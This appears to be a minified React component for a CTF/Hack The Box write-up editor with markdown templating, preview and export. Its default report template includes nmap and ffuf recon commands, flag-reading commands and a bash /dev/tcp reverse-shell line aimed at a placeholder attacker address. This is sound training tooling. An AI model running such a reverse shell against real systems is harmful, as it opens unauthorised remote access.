import{a as l,j as e,B as _,h as z,C as Y,c as Q,au as k,av as X,f as Z,D as q,X as J,k as ee,t as te,aG as T,am as re,aH as se}from"./vendor-ui-CNiukUYm.js";import{c as ae,a as oe,d as le,C as ne,s as ce,p as h,i as $,P as ie}from"./index-DR7SH85n.js";import"./vendor-react-DGIbdNnG.js";import"./vendor-utils-CjfOp2o3.js";const he=()=>{const{id:f}=ae(),{machines:p,writeupMachineId:F,setWriteupMachineId:w,updateMachine:b,soundEnabled:m,globalVars:y}=oe();l.useEffect(()=>{f&&p.some(t=>t.id===f)&&w(f)},[f,p,w]);const r=p.find(t=>t.id===F)||p[0],[P,S]=l.useState(!1),[O,E]=l.useState(!1),[i,x]=l.useState(""),[R,I]=l.useState(!1),[N,L]=l.useState(""),[v,A]=l.useState(""),[de,pe]=l.useState(null);l.useEffect(()=>{const t=setTimeout(()=>{A(N)},150);return()=>clearTimeout(t)},[N]);const g=l.useMemo(()=>v.trim()?ce(v,"ALL").slice(0,20):r?le(r,20):ne.slice(0,20),[v,r]),M=t=>{if(!r)return;const a={...y,targetIp:r.ip||y.targetIp},o=t.commands&&t.commands.length>0?`
\`\`\`bash
# ${t.title}
${t.commands.map(u=>$(u,a)).join(`
`)}
\`\`\`
`:"",j=`

---

### 📚 CPTS Field Manual: ${t.title}
> **Category:** ${t.category} | **Difficulty:** ${t.difficulty}
> ${t.summary||t.subCategory}
${o}`,d=i+j;x(d),b(r.id,{writeupMarkdown:d}),m&&h("root")},D=t=>{const a=new Date().toISOString().slice(0,10),o=t.tags.length>0?t.tags.join(", "):"ctf, pentest, writeup";return`---
title: "HTB / CTF Writeup - ${t.name}"
target_ip: "${t.ip}"
platform: "${t.platform}"
os: "${t.os}"
difficulty: "${t.difficulty}"
status: "${t.status}"
user_flag: "${t.userFlag||"FLAG{...}"}"
root_flag: "${t.rootFlag||"FLAG{...}"}"
time_spent: "${Math.round(t.timeSpentSeconds/60)} minutes"
tags: [${o}]
date: "${a}"
author: "ZeroBox Operator"
---

# ${t.name} — Writeup & Penetration Testing Report
**Target IP:** \`${t.ip}\` | **OS:** ${t.os} | **Platform:** ${t.platform} | **Difficulty:** ${t.difficulty}

---

## 1. Executive Summary & Difficulty Breakdown
- **Initial Foothold Vector:** [Brief summary of initial vulnerability, e.g. SQL Injection / LFI / Deserialization]
- **Privilege Escalation Vector:** [Brief summary of root escalation, e.g. SUID binary / Sudo misconfiguration / ADCS]
- **Perceived Rating:** ${t.difficulty} (Official) vs ${t.perceivedDifficulty||t.difficulty} (Perceived)

---

## 2. Reconnaissance & Nmap Scan Results
### TCP All-Ports Scan
\`\`\`bash
# Fast SYN and Service Version Detection
nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt ${t.ip}
\`\`\`

### Discovered Services:
- **Port 22/tcp:** Open (OpenSSH 8.4p1)
- **Port 80/tcp:** Open (Apache httpd 2.4.41)
- **Port 445/tcp:** Filtered (SMB)

### Web Directory & Endpoint Fuzzing
\`\`\`bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://${t.ip}/FUZZ -ac
\`\`\`

---

## 3. Vulnerability Analysis & Foothold Exploitation
### Discovery:
[Detail the attack vector found during enumeration]

### Exploitation Proof-of-Concept:
\`\`\`bash
# Reverse Shell or Exploit Execution
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
\`\`\`

### User Flag Loot:
\`\`\`bash
cat /home/*/user.txt
# Flag: ${t.userFlag||"FLAG{...}"}
\`\`\`

---

## 4. Privilege Escalation & Proof of Concept
### Internal Enumeration:
- Ran LinPEAS / WinPEAS automated audit.
- Identified misconfigured SUID / Sudo permissions:
\`\`\`bash
sudo -l
\`\`\`

### Root Escalation:
[Explain escalation path step by step]

### Root / System Flag:
\`\`\`bash
cat /root/root.txt
# Flag: ${t.rootFlag||"FLAG{...}"}
\`\`\`

---

## 5. Post-Exploitation Loot & Lessons Learned
- **Key Takeaway 1:** Always inspect source comments for credential leaks.
- **Key Takeaway 2:** Validate wildcard expansions in scheduled crontabs.
- **Mitigation:** Patch vulnerable services, restrict sudoers configuration, and apply least privilege principles.
`};l.useEffect(()=>{if(r)if(r.writeupMarkdown)x(r.writeupMarkdown);else{const t=D(r);x(t),b(r.id,{writeupMarkdown:t})}},[r==null?void 0:r.id]);const B=t=>{const a=t.target.value;x(a),r&&b(r.id,{writeupMarkdown:a})},W=()=>{if(r&&confirm(`Reset writeup for ${r.name} to standard template?`)){const t=D(r);x(t),b(r.id,{writeupMarkdown:t}),m&&h("root")}},U=()=>{navigator.clipboard.writeText(i),S(!0),m&&h("copy"),setTimeout(()=>S(!1),2e3)},V=()=>{if(!r)return;const t=new Blob([i],{type:"text/markdown;charset=utf-8"}),a=URL.createObjectURL(t),o=document.createElement("a");o.href=a,o.download=`${r.name.toLowerCase().replace(/[^a-z0-9]/g,"-")}-writeup.md`,document.body.appendChild(o),o.click(),document.body.removeChild(o),URL.revokeObjectURL(a),m&&h("root")},G=t=>{const a=t.split(`
`);let o=!1,j=[],d=!1,u="",C=[];const n=[];return a.forEach((s,c)=>{if(c===0&&s.trim()==="---"){o=!0;return}if(o){if(s.trim()==="---"){o=!1,n.push(e.jsxs("div",{className:"mb-4 p-3 rounded-lg bg-cyber-bg border border-cyber-cyan/30 text-[11px] font-mono text-cyber-cyan/90 space-y-0.5",children:[e.jsxs("div",{className:"text-[10px] uppercase font-bold text-cyber-muted mb-1 flex items-center gap-1",children:[e.jsx(se,{className:"w-3 h-3 text-cyber-cyan"})," OBSIDIAN / GITBOOK YAML FRONTMATTER"]}),j.map((H,K)=>e.jsx("div",{children:H},K))]},`fm-${c}`));return}j.push(s);return}if(s.startsWith("```")){d?(d=!1,n.push(e.jsxs("div",{className:"my-3 rounded-lg overflow-hidden border border-cyber-border bg-cyber-code",children:[u&&e.jsxs("div",{className:"bg-cyber-bg/80 px-3 py-1 text-[10px] text-cyber-muted font-mono uppercase border-b border-cyber-border flex items-center justify-between",children:[e.jsx("span",{children:u}),e.jsx(T,{className:"w-3 h-3"})]}),e.jsx("pre",{className:"p-3 text-xs text-cyber-emerald font-mono overflow-x-auto whitespace-pre-wrap",children:C.join(`
`)})]},`cb-${c}`))):(d=!0,u=s.replace("```","").trim(),C=[]);return}if(d){C.push(s);return}s.startsWith("# ")?n.push(e.jsx("h1",{className:"text-xl font-bold text-white mt-4 mb-2 pb-1 border-b border-cyber-border",children:s.replace("# ","")},c)):s.startsWith("## ")?n.push(e.jsx("h2",{className:"text-base font-bold text-cyber-cyan mt-4 mb-1.5 flex items-center gap-2",children:s.replace("## ","")},c)):s.startsWith("### ")?n.push(e.jsx("h3",{className:"text-sm font-semibold text-cyber-text mt-3 mb-1",children:s.replace("### ","")},c)):s.startsWith("---")?n.push(e.jsx("hr",{className:"my-3 border-cyber-border"},c)):s.startsWith("- ")?n.push(e.jsx("li",{className:"ml-4 text-xs text-cyber-text list-disc my-0.5",children:s.replace("- ","")},c)):s.trim()===""?n.push(e.jsx("div",{className:"h-2"},c)):n.push(e.jsx("p",{className:"text-xs text-cyber-text leading-relaxed font-sans",children:s},c))}),n};return e.jsxs("div",{className:"space-y-4 w-full font-mono",children:[e.jsxs("div",{className:"p-4 rounded-xl border border-cyber-border bg-cyber-card/90 shadow-md flex flex-wrap items-center justify-between gap-4",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"w-10 h-10 rounded-lg bg-cyber-bg border border-cyber-cyan/40 flex items-center justify-center",children:e.jsx(_,{className:"w-5 h-5 text-cyber-cyan"})}),e.jsxs("div",{children:[e.jsxs("h1",{className:"text-base font-bold text-white flex items-center gap-2",children:["EMBEDDED WRITEUP STUDIO",e.jsx("span",{className:"text-[10px] font-semibold px-2 py-0.5 rounded bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/30",children:"OBSIDIAN & GITBOOK READY"})]}),e.jsx("p",{className:"text-xs text-cyber-muted mt-0.5",children:"Dual-pane live editor with automated pentest template generation, frontmatter, and single-click .md export."})]})]}),e.jsxs("div",{className:"flex flex-wrap items-center gap-2.5",children:[e.jsxs("div",{className:"flex items-center gap-1.5 bg-cyber-bg px-2.5 py-1 rounded-lg border border-cyber-border",children:[e.jsx("span",{className:"text-[10px] uppercase font-bold text-cyber-muted",children:"Target Box:"}),e.jsx("select",{value:(r==null?void 0:r.id)||"",onChange:t=>w(t.target.value),className:"bg-transparent text-xs text-white font-bold focus:outline-none max-w-[180px] truncate",children:p.map(t=>e.jsxs("option",{value:t.id,className:"bg-cyber-card text-white",children:[t.name," (",t.platform,")"]},t.id))})]}),e.jsxs("button",{onClick:W,className:"flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white text-xs transition-colors",title:"Reset to fresh pentest template",children:[e.jsx(z,{className:"w-3.5 h-3.5"}),e.jsx("span",{className:"hidden sm:inline",children:"Reset Template"})]}),e.jsx("button",{onClick:U,className:"flex items-center gap-1 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-border hover:border-cyber-cyan text-white text-xs font-semibold transition-all",children:P?e.jsxs(e.Fragment,{children:[e.jsx(Y,{className:"w-3.5 h-3.5 text-cyber-emerald"}),e.jsx("span",{className:"text-cyber-emerald",children:"Copied!"})]}):e.jsxs(e.Fragment,{children:[e.jsx(Q,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Copy Raw"})]})}),e.jsxs("button",{onClick:()=>I(t=>!t),className:`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border text-xs font-bold transition-all shadow-sm ${R?"bg-purple-500 text-black border-purple-400 shadow-purple-500/30":"bg-purple-950/30 border-purple-500/40 text-purple-300 hover:bg-purple-900/40 hover:text-white"}`,title:"Toggle CPTS Field Manual Quick Reference Drawer",children:[e.jsx(k,{className:"w-3.5 h-3.5"}),e.jsxs("span",{children:["Field Manual (",g.length,")"]})]}),e.jsxs("button",{onClick:()=>E(!0),className:"flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-cyan/40 hover:border-cyber-cyan text-cyber-cyan hover:bg-cyber-cyan/10 text-xs font-bold transition-all shadow-glow-cyan/20",title:"Generate print-ready Executive Penetration Testing Report",children:[e.jsx(X,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Executive Report"})]}),!!(r!=null&&r.officialWalkthrough)&&e.jsxs("button",{onClick:()=>{if(!r.officialWalkthrough)return;const t=`

---

## 🛡️ Official Hack The Box Walkthrough & Intelligence
${r.officialWalkthrough}
`,a=i+t;x(a),b(r.id,{writeupMarkdown:a}),m&&h("engage")},className:"flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald/15 border border-cyber-emerald/40 hover:border-cyber-emerald text-cyber-emerald hover:bg-cyber-emerald hover:text-black text-xs font-bold transition-all shadow-sm",title:"Append official Hack The Box Walkthrough & Intelligence to this writeup",children:[e.jsx(Z,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"+ Official HTB Intel"})]}),e.jsxs("button",{onClick:V,className:"flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald text-black font-bold text-xs hover:bg-cyber-emerald/90 transition-all shadow-glow-emerald",children:[e.jsx(q,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Export .md"})]})]})]}),R&&e.jsxs("div",{className:"p-4 rounded-xl border border-purple-500/40 bg-cyber-card/95 shadow-2xl space-y-3 font-mono",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-cyber-border pb-2.5",children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx(k,{className:"w-4 h-4 text-purple-400"}),e.jsx("span",{className:"font-bold text-white text-xs tracking-wider",children:"CPTS FIELD MANUAL // QUICK REFERENCE & INSERT"}),e.jsxs("span",{className:"text-[10px] px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 font-mono",children:[g.length," MATCHES (MAX 20)"]})]}),e.jsx("button",{type:"button",onClick:()=>I(!1),className:"p-1 rounded text-cyber-muted hover:text-white",children:e.jsx(J,{className:"w-4 h-4"})})]}),e.jsxs("div",{className:"relative",children:[e.jsx(ee,{className:"w-3.5 h-3.5 text-cyber-muted absolute left-3 top-2.5"}),e.jsx("input",{type:"text",value:N,onChange:t=>L(t.target.value),placeholder:"Search field manual notes & commands (e.g. kerberoast, suid, lfi, bloodhound)...",className:"w-full bg-cyber-bg border border-cyber-border rounded-lg pl-8 pr-3 py-1.5 text-xs text-white placeholder-cyber-muted focus:outline-none focus:border-purple-400"})]}),e.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-72 overflow-y-auto pr-1",children:g.length===0?e.jsx("div",{className:"col-span-full p-4 text-center text-xs text-cyber-muted",children:"No matching field manual notes found."}):g.map(t=>e.jsxs("div",{className:"p-3 rounded-lg bg-cyber-bg border border-cyber-border hover:border-purple-500/50 transition-all space-y-2 flex flex-col justify-between",children:[e.jsxs("div",{className:"space-y-1",children:[e.jsxs("div",{className:"flex items-center justify-between gap-1",children:[e.jsx("span",{className:"font-bold text-white text-xs truncate",title:t.title,children:t.title}),e.jsx("span",{className:"text-[9px] px-1.5 py-0.2 rounded bg-purple-500/15 text-purple-300 border border-purple-500/30 flex-shrink-0 font-mono",children:t.difficulty})]}),e.jsx("div",{className:"text-[10px] text-cyber-muted line-clamp-2",children:t.summary||t.subCategory})]}),t.commands&&t.commands.length>0&&e.jsx("div",{className:"p-1.5 rounded bg-black/50 border border-cyber-border/70 font-mono text-[10px] text-cyber-cyan truncate",children:$(t.commands[0],{...y,targetIp:(r==null?void 0:r.ip)||y.targetIp})}),e.jsxs("div",{className:"flex items-center justify-between gap-2 pt-1 border-t border-cyber-border/50",children:[e.jsx("span",{className:"text-[9px] text-cyber-muted font-mono truncate",children:t.category}),e.jsxs("button",{type:"button",onClick:()=>M(t),className:"flex items-center gap-1 px-2.5 py-1 rounded bg-purple-500/20 hover:bg-purple-500 hover:text-black border border-purple-500/40 text-purple-300 text-[10px] font-bold transition-all",title:"Insert this note and commands into active writeup",children:[e.jsx(te,{className:"w-3 h-3"}),e.jsx("span",{children:"Insert"})]})]})]},t.id))})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-4 items-stretch min-h-[calc(100vh-250px)]",children:[e.jsxs("div",{className:"flex flex-col rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-cyber-border px-4 py-2.5 bg-cyber-bg/70 text-xs",children:[e.jsxs("span",{className:"font-bold text-white flex items-center gap-2",children:[e.jsx(T,{className:"w-4 h-4 text-cyber-cyan"})," RAW MARKDOWN (YAML & BODY)"]}),e.jsxs("span",{className:"text-[10px] text-cyber-muted",children:[i.length," chars · ",i.split(`
`).length," lines"]})]}),e.jsx("textarea",{value:i,onChange:B,placeholder:"Write your penetration testing report or paste notes here...",className:"flex-1 w-full p-4 bg-cyber-bg text-cyber-text font-mono text-xs focus:outline-none resize-none leading-relaxed overflow-y-auto",spellCheck:!1})]}),e.jsxs("div",{className:"flex flex-col rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-cyber-border px-4 py-2.5 bg-cyber-bg/70 text-xs",children:[e.jsxs("span",{className:"font-bold text-white flex items-center gap-2",children:[e.jsx(re,{className:"w-4 h-4 text-cyber-emerald"})," LIVE RENDERED PREVIEW"]}),e.jsxs("span",{className:"text-[10px] text-cyber-emerald font-semibold flex items-center gap-1",children:[e.jsx(k,{className:"w-3 h-3"})," OBSIDIAN PREVIEW"]})]}),e.jsx("div",{className:"flex-1 p-5 overflow-y-auto max-h-[calc(100vh-280px)] bg-cyber-card/40",children:G(i)})]})]}),e.jsx(ie,{machine:r||p[0]||null,isOpen:O,onClose:()=>E(!1)})]})};export{he as WriteupStudio};
